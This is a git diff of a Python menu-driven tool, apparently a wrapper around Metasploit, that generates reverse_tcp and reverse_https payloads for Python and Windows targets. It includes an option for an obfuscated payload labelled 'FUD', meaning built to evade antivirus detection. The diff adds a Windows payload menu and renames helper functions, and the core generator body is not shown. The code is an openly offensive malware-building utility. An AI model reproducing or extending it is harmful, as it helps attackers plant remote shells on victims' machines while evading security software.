@@ -4,10 +4,12 @@ import subprocess
 import sys
 import re 
 import base64
-#custom import 
-import varsx 
 import random
 import string 
+import time 
+#custom import 
+import varsx 
+
 
 banner= ('''@@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@   @@@@@@   @@@@@@@  
 @@@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@@@@@  
@@ -35,6 +37,8 @@ banner= ('''@@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @
 
 lhost = varsx.lhost
 lport = varsx.lport
+pyoutfile = varsx.pyoutfile
+winoutfile = varsx.winoutfile
 talkbackm1 = "tcp"
 
 def clearscreen():
@@ -43,18 +47,18 @@ def clearscreen():
     elif sys.platform == "win32":
         subprocess.run("cls")
 
-#For prntopt func
+#For printopt func
 n = 1
-def prntopt(texxt):  
+def printopt(texxt):  
     global n
     print(colorama.Fore.BLUE + "[" +  colorama.Style.RESET_ALL + str(n) + colorama.Fore.BLUE + "] " + colorama.Fore.LIGHTBLUE_EX + texxt + colorama.Style.RESET_ALL)
     n += 1   
 
-def prntbannred(texxt):
+def printbannred(texxt):
     return print(colorama.Fore.LIGHTRED_EX +  "#=====+" + texxt + "+=====#" )
 
-def done(texxt):
-    print(colorama.Fore.LIGHTGREEN_EX + str(texxt) + colorama.Style.RESET_ALL)
+    
+    
 
 def inputcopt(texxt):
     print("\n")
@@ -84,8 +88,8 @@ def payloadgen1(payload, talkback, lhost, lport, outfile):
 def asktb():
     global n, talkbackm1 
     n = 1 
-    prntopt("Use reverse_tcp")
-    prntopt("Use reverse_https")
+    printopt("Use reverse_tcp")
+    printopt("Use reverse_https")
     talkbackopt = inputcopt("Option: ").strip()
     if  talkbackopt == "1" or talkbackopt == "tcp":
         talkbackm1 = "tcp"
@@ -98,16 +102,15 @@ def asktb():
 
 
 def pythonpayload():
-    global n, pyoutfile
+    global n, pyoutfile, lhost, lport, talkbackm1 
     n = 1
-    pyoutfile = varsx.pyoutfile
     clearscreen()
-    prntbannred("Python Payload Menu")
-    prntopt("Create a simple python payload")
-    prntopt("Create an obfistucated (FUD) python payload")
-    asktb()
+    printbannred("Python Payload Menu")
+    printopt("Create a simple python payload")
+    printopt("Create an obfistucated (FUD) python payload")
     inputpy = inputc("Option: ").strip()
     lask()
+    asktb()
     inputpy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({pyoutfile}){colorama.Fore.BLUE}: ")
     if inputpy2.strip() != "":
         pyoutfile = inputpy2
@@ -147,20 +150,41 @@ def pythonpayloadfud():
     file = open(pyoutfile, "w")
     file.write(outpy)
     file.close
-    done(f"Saved as {pyoutfile} \nDone!")
+    print(colorama.Fore.LIGHTGREEN_EX + f"Done! \n Saved as {pyoutfile}" + colorama.Style.RESET_ALL)
+
+def winpayload():                         
+    global n, winoutfile, lhost, lport, talkbackm1
+    printbannred("Windows Payload Menu")
+    printopt("Create a simple windows payload")
+    inputwin = inputcopt("Option: ").strip()
+    lask()
+    asktb()
+    if inputwin == "1": 
+        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
+        payloadgen1("windows", talkbackm1, lhost, lport, winoutfile)
+        print(colorama.Style.RESET_ALL)
+        print(colorama.Fore.LIGHTGREEN_EX + f"Done! \nSaved as {winoutfile}" + colorama.Style.RESET_ALL)
+
+    else:
+        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputwin} is not valid" + colorama.Style.RESET_ALL) 
+        time.sleep(5)
+        winpayload()   
 
 
     
 
 def menu():
-    prntopt("Create a python payload (MSF)")
-    prntopt("Create a windows payload (MSF)")
-    prntopt("Create an android payload (MSF)")
-    prntopt("Create an embedded android payload (MSF, Reverse TCP)")
-    prntopt("Start the Metasploit Framework Console")
+    printopt("Create a python payload (MSF)")
+    printopt("Create a windows payload (MSF)")
+    printopt("Create an android payload (MSF)")
+    printopt("Start the Metasploit Framework Console")
     input1 = inputcopt("Option: ")
     if input1 == "1":
         pythonpayload()
+    elif input1 == "2":
+        winpayload()
+    else:
+        menu()        
         
 def main():
     clearscreen()
